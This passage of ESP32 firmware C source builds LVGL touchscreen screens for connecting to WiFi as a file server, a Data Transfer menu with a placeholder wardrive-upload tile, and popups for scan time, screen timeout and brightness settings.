    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
    esp_wifi_connect();

    /* Poll every 1s for IP */
    if (s_fileserv_poll_timer) lv_timer_del(s_fileserv_poll_timer);
    s_fileserv_poll_timer = lv_timer_create(s_fileserv_poll_ip_cb, 1000, NULL);
}

static void show_wifi_client_server_screen(void)
{
    create_function_page_base("WiFi File Server");
    apply_menu_bg();

    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 50);
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 6, 0);
    lv_obj_set_style_pad_gap(content, 4, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);

    /* SSID label + textarea */
    lv_obj_t *ssid_lbl = lv_label_create(content);
    lv_label_set_text(ssid_lbl, "Network SSID:");
    lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ssid_lbl, ui_text_color(), 0);

    s_wcs_ssid_ta = lv_textarea_create(content);
    lv_obj_set_width(s_wcs_ssid_ta, lv_pct(100));
    lv_textarea_set_one_line(s_wcs_ssid_ta, true);
    lv_textarea_set_placeholder_text(s_wcs_ssid_ta, "Enter SSID");
    if (g_saved_wifi_ssid[0]) lv_textarea_set_text(s_wcs_ssid_ta, g_saved_wifi_ssid);
    lv_obj_set_style_bg_color(s_wcs_ssid_ta, ui_bg_color(), 0);
    lv_obj_set_style_text_color(s_wcs_ssid_ta, ui_text_color(), 0);
    lv_obj_set_style_border_color(s_wcs_ssid_ta, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_text_font(s_wcs_ssid_ta, &lv_font_montserrat_12, 0);
    lv_obj_add_event_cb(s_wcs_ssid_ta, s_wcs_ta_focus_cb, LV_EVENT_CLICKED, NULL);

    /* Password label + textarea */
    lv_obj_t *pass_lbl = lv_label_create(content);
    lv_label_set_text(pass_lbl, "Password:");
    lv_obj_set_style_text_font(pass_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(pass_lbl, ui_text_color(), 0);

    s_wcs_pass_ta = lv_textarea_create(content);
    lv_obj_set_width(s_wcs_pass_ta, lv_pct(100));
    lv_textarea_set_one_line(s_wcs_pass_ta, true);
    lv_textarea_set_placeholder_text(s_wcs_pass_ta, "Enter password");
    if (g_saved_wifi_pass[0]) lv_textarea_set_text(s_wcs_pass_ta, g_saved_wifi_pass);
    lv_obj_set_style_bg_color(s_wcs_pass_ta, ui_bg_color(), 0);
    lv_obj_set_style_text_color(s_wcs_pass_ta, ui_text_color(), 0);
    lv_obj_set_style_border_color(s_wcs_pass_ta, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_text_font(s_wcs_pass_ta, &lv_font_montserrat_12, 0);
    lv_textarea_set_password_mode(s_wcs_pass_ta, true);
    lv_obj_add_event_cb(s_wcs_pass_ta, s_wcs_ta_focus_cb, LV_EVENT_CLICKED, NULL);

    s_fileserv_status_lbl = lv_label_create(content);
    lv_label_set_text(s_fileserv_status_lbl, "Not connected");
    lv_obj_set_style_text_font(s_fileserv_status_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(s_fileserv_status_lbl, ui_muted_color(), 0);

    s_fileserv_ip_lbl = lv_label_create(content);
    lv_label_set_text(s_fileserv_ip_lbl, "");
    lv_obj_set_style_text_font(s_fileserv_ip_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(s_fileserv_ip_lbl, UI_ACCENT_CYAN, 0);
    lv_label_set_long_mode(s_fileserv_ip_lbl, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(s_fileserv_ip_lbl, lv_pct(100));

    /* Bottom button row: Stop | Connect */
    lv_obj_t *btn_row = lv_obj_create(function_page);
    lv_obj_set_size(btn_row, lv_pct(100), 40);
    lv_obj_align(btn_row, LV_ALIGN_BOTTOM_MID, 0, -6);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_hor(btn_row, 6, 0);
    lv_obj_set_style_pad_ver(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *stop_btn = lv_btn_create(btn_row);
    lv_obj_set_size(stop_btn, 100, 32);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
    lv_label_set_text(stop_lbl, LV_SYMBOL_CLOSE " Back");
    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_lbl, lv_color_white(), 0);
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(stop_btn, s_fileserv_stop_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *conn_btn = lv_btn_create(btn_row);
    lv_obj_set_size(conn_btn, 110, 32);
    lv_obj_set_style_bg_color(conn_btn, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_bg_color(conn_btn, lv_color_lighten(UI_ACCENT_CYAN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(conn_btn, 8, 0);
    lv_obj_t *conn_lbl = lv_label_create(conn_btn);
    lv_label_set_text(conn_lbl, LV_SYMBOL_WIFI " Connect");
    lv_obj_set_style_text_font(conn_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(conn_lbl, lv_color_black(), 0);
    lv_obj_center(conn_lbl);
    lv_obj_add_event_cb(conn_btn, s_wcs_connect_cb, LV_EVENT_CLICKED, NULL);

    /* Keyboard — hidden until a text area is tapped */
    s_wcs_keyboard = lv_keyboard_create(function_page);
    lv_keyboard_set_textarea(s_wcs_keyboard, s_wcs_ssid_ta);
    lv_keyboard_set_mode(s_wcs_keyboard, LV_KEYBOARD_MODE_TEXT_LOWER);
    lv_obj_set_size(s_wcs_keyboard, lv_pct(100), lv_pct(40));
    lv_obj_align(s_wcs_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(s_wcs_keyboard, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(s_wcs_keyboard, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_bg_color(s_wcs_keyboard, lv_color_make(0, 80, 40), LV_PART_ITEMS);
    lv_obj_set_style_bg_color(s_wcs_keyboard, lv_color_make(0, 140, 80), LV_PART_ITEMS | LV_STATE_PRESSED);
    lv_obj_set_style_text_color(s_wcs_keyboard, ui_text_color(), LV_PART_ITEMS);
    lv_obj_add_event_cb(s_wcs_keyboard, s_wcs_kb_event_cb, LV_EVENT_READY,  NULL);
    lv_obj_add_event_cb(s_wcs_keyboard, s_wcs_kb_event_cb, LV_EVENT_CANCEL, NULL);
    lv_obj_add_flag(s_wcs_keyboard, LV_OBJ_FLAG_HIDDEN);

    s_wcs_active_ta = s_wcs_ssid_ta;
}

// ── Data Transfer sub-menu screen ────────────────────────────────────────────

static void data_transfer_tile_cb(lv_event_t *e)
{
    const char *key = (const char *)lv_event_get_user_data(e);
    if (!key) return;
    if (strcmp(key, "AP File Server") == 0)      show_ap_file_server_screen();
    else if (strcmp(key, "WiFi Client") == 0)    show_wifi_client_server_screen();
    else if (strcmp(key, "Wardrive Upload") == 0) {
        // Placeholder
        if (s_fileserv_status_lbl) return;
        lv_obj_t *msg = lv_msgbox_create(lv_scr_act(), "Coming Soon",
            "Wardrive data upload to WiGLE\nand other services will be\nadded in a future update.", NULL, true);
        lv_obj_center(msg);
    }
}

static void data_transfer_back_cb(lv_event_t *e)
{
    (void)e;
    show_settings_screen();
}

static void show_data_transfer_screen(void)
{
    create_function_page_base("Data Transfer");
    apply_menu_bg();

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30 - 44);
    lv_obj_align(tiles, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 4, 0);
    lv_obj_set_style_pad_gap(tiles, 4, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    create_tile(tiles, LV_SYMBOL_UPLOAD,  "AP File\nServer",   UI_ACCENT_CYAN,          data_transfer_tile_cb, "AP File Server");
    create_tile(tiles, LV_SYMBOL_WIFI,    "WiFi\nClient",      COLOR_MATERIAL_GREEN,     data_transfer_tile_cb, "WiFi Client");
    create_tile(tiles, LV_SYMBOL_UPLOAD,  "Wardrive\nUpload",  lv_color_hex(0xE91E63),  data_transfer_tile_cb, "Wardrive Upload");

    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 30);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -8);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_t *back_lbl = lv_label_create(back_btn);
    lv_label_set_text(back_lbl, LV_SYMBOL_LEFT " Settings");
    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
    lv_obj_center(back_lbl);
    lv_obj_add_event_cb(back_btn, data_transfer_back_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// Scan Time Popup (min/max active scan time per channel)
// ============================================================================

static lv_obj_t *scantime_popup = NULL;
static lv_obj_t *scantime_min_slider = NULL;
static lv_obj_t *scantime_max_slider = NULL;
static lv_obj_t *scantime_min_label = NULL;
static lv_obj_t *scantime_max_label = NULL;

static void scantime_min_slider_cb(lv_event_t *e)
{
    (void)e;
    if (!scantime_min_slider || !scantime_min_label || !scantime_max_slider) return;
    int32_t min_val = lv_slider_get_value(scantime_min_slider);
    int32_t max_val = lv_slider_get_value(scantime_max_slider);
    // Enforce min < max
    if (min_val >= max_val) {
        min_val = max_val - 10;
        if (min_val < 50) min_val = 50;
        lv_slider_set_value(scantime_min_slider, min_val, LV_ANIM_OFF);
    }
    char buf[24];
    snprintf(buf, sizeof(buf), "Min: %ldms", (long)min_val);
    lv_label_set_text(scantime_min_label, buf);
}

static void scantime_max_slider_cb(lv_event_t *e)
{
    (void)e;
    if (!scantime_max_slider || !scantime_max_label || !scantime_min_slider) return;
    int32_t max_val = lv_slider_get_value(scantime_max_slider);
    int32_t min_val = lv_slider_get_value(scantime_min_slider);
    // Enforce max > min
    if (max_val <= min_val) {
        max_val = min_val + 10;
        if (max_val > 1000) max_val = 1000;
        lv_slider_set_value(scantime_max_slider, max_val, LV_ANIM_OFF);
    }
    char buf[24];
    snprintf(buf, sizeof(buf), "Max: %ldms", (long)max_val);
    lv_label_set_text(scantime_max_label, buf);
}

static void scantime_popup_save_cb(lv_event_t *e)
{
    (void)e;
    if (!scantime_min_slider || !scantime_max_slider || !scantime_popup) return;

    uint16_t min_val = (uint16_t)lv_slider_get_value(scantime_min_slider);
    uint16_t max_val = (uint16_t)lv_slider_get_value(scantime_max_slider);
    if (min_val >= max_val) { min_val = max_val > 50 ? max_val - 10 : 50; }

    scan_time_min_ms = min_val;
    scan_time_max_ms = max_val;
    nvs_settings_save_scan_time(min_val, max_val);
    wifi_scanner_set_scan_time(min_val, max_val);

    lv_obj_del(scantime_popup);
    scantime_popup = NULL;
    scantime_min_slider = NULL;
    scantime_max_slider = NULL;
    scantime_min_label = NULL;
    scantime_max_label = NULL;
}

static void scantime_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (scantime_popup) {
        lv_obj_del(scantime_popup);
        scantime_popup = NULL;
        scantime_min_slider = NULL;
        scantime_max_slider = NULL;
        scantime_min_label = NULL;
        scantime_max_label = NULL;
    }
}

static void show_scan_time_popup(void)
{
    if (scantime_popup) return;

    // Modal overlay
    scantime_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(scantime_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(scantime_popup, 0, 0);
    lv_obj_set_style_bg_color(scantime_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(scantime_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(scantime_popup, 0, 0);
    lv_obj_set_style_radius(scantime_popup, 0, 0);
    lv_obj_clear_flag(scantime_popup, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(scantime_popup, LV_OBJ_FLAG_CLICKABLE);

    // Dialog box — 220px wide to fit 240px portrait display
    lv_obj_t *dialog = lv_obj_create(scantime_popup);
    lv_obj_set_size(dialog, 220, LV_SIZE_CONTENT);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 10, 0);
    lv_obj_set_style_pad_gap(dialog, 6, 0);

    // Title
    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, "Scan Time / Channel");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);

    // Min label
    scantime_min_label = lv_label_create(dialog);
    char buf_min[16];
    snprintf(buf_min, sizeof(buf_min), "Min: %ums", scan_time_min_ms);
    lv_label_set_text(scantime_min_label, buf_min);
    lv_obj_set_style_text_color(scantime_min_label, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_text_font(scantime_min_label, &lv_font_montserrat_12, 0);

    // Min slider — 196px: dialog content width (220 - 2×10 padding - 4px slider knob margin)
    scantime_min_slider = lv_slider_create(dialog);
    lv_obj_set_width(scantime_min_slider, 196);
    lv_slider_set_range(scantime_min_slider, 50, 1000);
    lv_slider_set_value(scantime_min_slider, scan_time_min_ms, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(scantime_min_slider, lv_color_make(80, 80, 80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(scantime_min_slider, COLOR_MATERIAL_PURPLE, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(scantime_min_slider, COLOR_MATERIAL_PURPLE, LV_PART_KNOB);
    lv_obj_set_style_pad_all(scantime_min_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(scantime_min_slider, scantime_min_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);

    // Max label
    scantime_max_label = lv_label_create(dialog);
    char buf_max[16];
    snprintf(buf_max, sizeof(buf_max), "Max: %ums", scan_time_max_ms);
    lv_label_set_text(scantime_max_label, buf_max);
    lv_obj_set_style_text_color(scantime_max_label, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_text_font(scantime_max_label, &lv_font_montserrat_12, 0);

    // Max slider
    scantime_max_slider = lv_slider_create(dialog);
    lv_obj_set_width(scantime_max_slider, 196);
    lv_slider_set_range(scantime_max_slider, 50, 1000);
    lv_slider_set_value(scantime_max_slider, scan_time_max_ms, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(scantime_max_slider, lv_color_make(80, 80, 80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(scantime_max_slider, COLOR_MATERIAL_PURPLE, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(scantime_max_slider, COLOR_MATERIAL_PURPLE, LV_PART_KNOB);
    lv_obj_set_style_pad_all(scantime_max_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(scantime_max_slider, scantime_max_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);

    // Button row — 196px, 90px buttons
    lv_obj_t *btn_row = lv_obj_create(dialog);
    lv_obj_set_size(btn_row, 196, 36);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 90, 30);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, scantime_popup_close_cb, LV_EVENT_CLICKED, NULL);

    // Save button
    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 90, 30);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_PURPLE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_t *save_lbl = lv_label_create(save_btn);
    lv_label_set_text(save_lbl, "Save");
    lv_obj_set_style_text_color(save_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(save_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(save_lbl);
    lv_obj_add_event_cb(save_btn, scantime_popup_save_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// Screen Timeout Popup
// ============================================================================

static lv_obj_t *timeout_popup = NULL;
static lv_obj_t *timeout_dropdown = NULL;

// Map dropdown index to milliseconds: 0=10s, 1=30s, 2=1min, 3=5min, 4=stays on
static int32_t timeout_index_to_ms(uint16_t idx)
{
    switch (idx) {
        case 0: return 10000;
        case 1: return 30000;
        case 2: return 60000;
        case 3: return 300000;
        case 4: return 0;      // Stays on
        default: return 0;
    }
}

static uint16_t timeout_ms_to_index(int32_t ms)
{
    switch (ms) {
        case 10000:  return 0;
        case 30000:  return 1;
        case 60000:  return 2;
        case 300000: return 3;
        case 0:      return 4;  // Stays on
        default:     return 4;
    }
}

static void timeout_popup_save_cb(lv_event_t *e)
{
    (void)e;
    if (!timeout_dropdown || !timeout_popup) return;

    uint16_t sel = lv_dropdown_get_selected(timeout_dropdown);
    screen_timeout_ms = timeout_index_to_ms(sel);
    nvs_settings_save_timeout(screen_timeout_ms);

    // Pause or resume idle timer
    if (screen_idle_timer) {
        if (screen_timeout_ms == 0) {
            lv_timer_pause(screen_idle_timer);
            ESP_LOGI(TAG, "Screen timeout: Stays on (timer paused)");
        } else {
            last_input_ms = esp_timer_get_time() / 1000;
            lv_timer_resume(screen_idle_timer);
            ESP_LOGI(TAG, "Screen timeout set to %ldms", (long)screen_timeout_ms);
        }
    }

    // Close popup
    lv_obj_del(timeout_popup);
    timeout_popup = NULL;
    timeout_dropdown = NULL;
}

static void timeout_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (timeout_popup) {
        lv_obj_del(timeout_popup);
        timeout_popup = NULL;
        timeout_dropdown = NULL;
    }
}

static void show_screen_timeout_popup(void)
{
    if (timeout_popup) return;

    // Modal overlay
    timeout_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(timeout_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(timeout_popup, 0, 0);
    lv_obj_set_style_bg_color(timeout_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(timeout_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(timeout_popup, 0, 0);
    lv_obj_set_style_radius(timeout_popup, 0, 0);
    lv_obj_clear_flag(timeout_popup, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(timeout_popup, LV_OBJ_FLAG_CLICKABLE);

    // Dialog box
    lv_obj_t *dialog = lv_obj_create(timeout_popup);
    lv_obj_set_size(dialog, 300, 200);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 15, 0);
    lv_obj_set_style_pad_gap(dialog, 12, 0);

    // Title
    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, "Screen Timeout");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, 0);

    // Dropdown
    timeout_dropdown = lv_dropdown_create(dialog);
    lv_dropdown_set_options(timeout_dropdown,
        "10 seconds\n30 seconds\n1 minute\n5 minutes\nStays on");
    lv_obj_set_width(timeout_dropdown, 250);
    lv_obj_set_style_bg_color(timeout_dropdown, lv_color_make(50, 50, 50), 0);
    lv_obj_set_style_text_color(timeout_dropdown, ui_text_color(), 0);
    lv_obj_set_style_border_color(timeout_dropdown, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(timeout_dropdown, 1, 0);
    lv_obj_set_style_radius(timeout_dropdown, 8, 0);
    // Style the dropdown list (opened part)
    lv_obj_set_style_bg_color(lv_dropdown_get_list(timeout_dropdown), lv_color_make(40, 40, 40), 0);
    lv_obj_set_style_text_color(lv_dropdown_get_list(timeout_dropdown), ui_text_color(), 0);
    lv_obj_set_style_border_color(lv_dropdown_get_list(timeout_dropdown), COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_bg_color(lv_dropdown_get_list(timeout_dropdown), COLOR_MATERIAL_TEAL, LV_PART_SELECTED | LV_STATE_CHECKED);

    // Set current value
    lv_dropdown_set_selected(timeout_dropdown, timeout_ms_to_index(screen_timeout_ms));

    // Button row
    lv_obj_t *btn_row = lv_obj_create(dialog);
    lv_obj_set_size(btn_row, 250, 42);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 110, 36);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, timeout_popup_close_cb, LV_EVENT_CLICKED, NULL);

    // Save button
    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 110, 36);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_t *save_lbl = lv_label_create(save_btn);
    lv_label_set_text(save_lbl, "Save");
    lv_obj_set_style_text_color(save_lbl, ui_text_color(), 0);
    lv_obj_center(save_lbl);
    lv_obj_add_event_cb(save_btn, timeout_popup_save_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// Screen Brightness Popup
// ============================================================================

static lv_obj_t *brightness_popup = NULL;
static lv_obj_t *brightness_slider = NULL;
static lv_obj_t *brightness_value_label = NULL;
static uint8_t brightness_before_popup = 80;  // To restore on cancel

static void brightness_slider_event_cb(lv_event_t *e)
{
    (void)e;
    if (!brightness_slider || !brightness_value_label) return;
    int32_t val = lv_slider_get_value(brightness_slider);
    // Update label
    char buf[8];
    snprintf(buf, sizeof(buf), "%ld%%", (long)val);
    lv_label_set_text(brightness_value_label, buf);
    // Live preview
    set_backlight_percent((uint8_t)val);
}

static void brightness_popup_save_cb(lv_event_t *e)
{
    (void)e;
    if (!brightness_slider || !brightness_popup) return;
    screen_brightness_pct = (uint8_t)lv_slider_get_value(brightness_slider);
    nvs_settings_save_brightness(screen_brightness_pct);
    set_backlight_percent(screen_brightness_pct);

    lv_obj_del(brightness_popup);
    brightness_popup = NULL;
    brightness_slider = NULL;
    brightness_value_label = NULL;
}

static void brightness_popup_close_cb(lv_event_t *e)
{
    (void)e;
    // Restore previous brightness
    set_backlight_percent(brightness_before_popup);
    if (brightness_popup) {
        lv_obj_del(brightness_popup);
        brightness_popup = NULL;
        brightness_slider = NULL;
        brightness_value_label = NULL;
    }
}

static void show_screen_brightness_popup(void)
{
    if (brightness_popup) return;
    brightness_before_popup = screen_brightness_pct;

    // Modal overlay
    brightness_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(brightness_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(brightness_popup, 0, 0);
    lv_obj_set_style_bg_color(brightness_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(brightness_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(brightness_popup, 0, 0);
    lv_obj_set_style_radius(brightness_popup, 0, 0);
    lv_obj_clear_flag(brightness_popup, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(brightness_popup, LV_OBJ_FLAG_CLICKABLE);

    // Dialog box
    lv_obj_t *dialog = lv_obj_create(brightness_popup);
    lv_obj_set_size(dialog, 320, 190);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 15, 0);
    lv_obj_set_style_pad_gap(dialog, 10, 0);

    // Title
    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, "Screen Level");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, 0);

    // Value label
    brightness_value_label = lv_label_create(dialog);
    char buf[8];
    snprintf(buf, sizeof(buf), "%u%%", screen_brightness_pct);
    lv_label_set_text(brightness_value_label, buf);
    lv_obj_set_style_text_color(brightness_value_label, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(brightness_value_label, &lv_font_montserrat_20, 0);

    // Slider
    brightness_slider = lv_slider_create(dialog);
    lv_obj_set_width(brightness_slider, 200);
    lv_slider_set_range(brightness_slider, 10, 100);
    lv_slider_set_value(brightness_slider, screen_brightness_pct, LV_ANIM_OFF);
    // Slider knob style
    lv_obj_set_style_bg_color(brightness_slider, lv_color_make(80, 80, 80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(brightness_slider, COLOR_MATERIAL_ORANGE, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(brightness_slider, COLOR_MATERIAL_ORANGE, LV_PART_KNOB);
    lv_obj_set_style_pad_all(brightness_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(brightness_slider, brightness_slider_event_cb, LV_EVENT_VALUE_CHANGED, NULL);

    // Button row
    lv_obj_t *btn_row = lv_obj_create(dialog);
    lv_obj_set_size(btn_row, 260, 42);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
